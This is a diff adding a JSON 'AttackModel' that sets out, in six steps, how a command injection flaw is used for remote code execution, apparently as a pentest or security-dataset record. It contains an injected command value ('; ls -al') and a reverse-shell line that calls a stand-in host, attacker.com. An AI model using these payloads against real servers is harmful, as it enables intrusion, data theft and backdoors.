@@ -1,0 +1,30 @@
+{
+    "AttackModel": {
+        "Steps": [
+            {
+                "StepNumber": 1,
+                "StepString": "Entered a malicious payload containing system commands into a user input parameter, such as ; ls -al, which would cause the application to execute the 'ls -al' command on the server"
+            },
+            {
+                "StepNumber": 2,
+                "StepString": "Submitted the payload and confirmed presence of an RCE vulnerability"
+            },
+            {
+                "StepNumber": 3,
+                "StepString": "Researched the application's system and network configuration"
+            },
+            {
+                "StepNumber": 4,
+                "StepString": "Crafted a suitable payload containing a reverse shell command, such as ; bash -i >& /dev/tcp/attacker.com/1234 0>&1"
+            },
+            {
+                "StepNumber": 5,
+                "StepString": "Executed the payload to obtain sensitive information and establish a persistent backdoor to the server"
+            },
+            {
+                "StepNumber": 6,
+                "StepString": "Demonstrated potential risks associated with RCE"
+            }
+        ]
+    }
+}
